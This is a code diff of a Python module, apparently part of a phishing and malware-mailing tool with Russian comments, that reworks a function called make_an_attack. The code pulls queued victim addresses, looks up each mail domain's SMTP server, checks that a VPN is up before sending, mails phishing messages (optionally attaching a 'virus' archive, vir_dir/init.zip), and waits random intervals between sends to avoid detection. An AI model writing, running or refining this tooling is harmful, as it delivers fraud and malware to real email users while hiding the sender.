@@ -1,17 +1,18 @@
+import os
+import random
 import smtplib
+from time import sleep
+from threading import Thread
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
-from time import sleep
-import random
-import os
-
 from manager.models.Stack import Stack
+from grabber.models.Emails import EmailConfigs
 from core import daemon
-from threading import Thread
 
-"""Запускает процесс атаки в thread
+"""
+    Проверяет базу на status=0 и запускает процесс атаки в thread.
 """
 
 
@@ -25,9 +26,9 @@ class Attacking(Thread):
 
 
 def make_an_attack():
+    if daemon.get_config('attacking') == '1':
+        return
     daemon.set_config('attacking', '1')
-    host = daemon.get_config('host')
-    port = daemon.get_config('port')
     try:
         while True:
             stack = Stack.objects.all().filter(status='0')
@@ -37,13 +38,24 @@ def make_an_attack():
                 return
             for email in stack:
                 result = ''
+                try:
+                    eml_prm = EmailConfigs.objects.get(name=email.email.split('@')[1])
+                except EmailConfigs.DoesNotExist:
+                    daemon.logging('make_an_attack', 'Неизвестный Хост и Порт для {0}'.format(email.email))
+                    continue
+                if not daemon.check_ip():
+                    daemon.logging('make_an_attack', 'Не могу подключиться к VPN при атаке почты {0}'.format(email.email))
+                    daemon.set_config('attacking', '0')
+                    return
                 if email.method == '1':
-                    result = send_fishing(host, port, email.sender, email.sender_password, email.email, email.subject,
+                    result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password, email.email,
+                                          email.subject,
                                           email.body)
                 if email.method == '2':
                     the_file = os.getcwd() + '/vir_dir/init.zip'
                     # TODO: Генерация вируса и добавление пути
-                    result = send_fishing(host, port, email.sender, email.sender_password, email.email, email.subject,
+                    result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password, email.email,
+                                          email.subject,
                                           email.body, the_file)
                 if email.method == '3':
                     send_fishing_with_virus()
@@ -54,15 +66,11 @@ def make_an_attack():
                 else:
                     email.status = '4'
                 email.save()
-                sleep(random.randint(30, 180))
+                sleep(random.randint(30, 120))
     except Exception as e:
         daemon.logging('make_an_attack', str(e))
     finally:
         daemon.set_config('attacking', '0')
-
-
-def send_vir():
-    pass
 
 
 def send_fishing(host, port, sender, sender_password, email, subject, body, file=None):
@@ -95,7 +103,7 @@ def send_fishing(host, port, sender, sender_password, email, subject, body, file
     try:
         session.login(sender, sender_password)
     except Exception as e:
-        return 'err. Ошибка аутентификации для {0} с паролем {1} при отправке {2}. Ошибка: {3}'\
+        return 'err. Ошибка аутентификации для {0} с паролем {1} при отправке {2}. Ошибка: {3}' \
             .format(sender, sender_password, atk_type, str(e))
     try:
         session.sendmail(sender, email, msg.as_string().encode('utf-8'))
@@ -106,4 +114,8 @@ def send_fishing(host, port, sender, sender_password, email, subject, body, file
 
 
 def send_fishing_with_virus():
+    pass
+
+
+def send_vir():
     pass
